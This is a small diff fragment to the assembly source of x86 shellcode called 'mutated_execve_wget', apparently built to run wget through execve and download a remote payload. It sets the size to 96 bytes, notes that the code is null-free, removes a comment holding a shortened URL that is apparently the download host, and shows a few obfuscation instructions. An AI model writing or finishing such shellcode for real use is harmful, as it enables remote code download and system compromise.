@@ -20,7 +20,7 @@
 
 ;   mutated_execve_wget
 ;
-;   * bytes
+;   * 96 bytes
 ;   * null-free
 ;   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)
 ;
@@ -49,8 +49,6 @@ _start:
 	mul ebx
 	mov ebp, -11
 
-
-	; is.gd/ZLAeEr
 
 	jmp $+3
 	db 0xe8
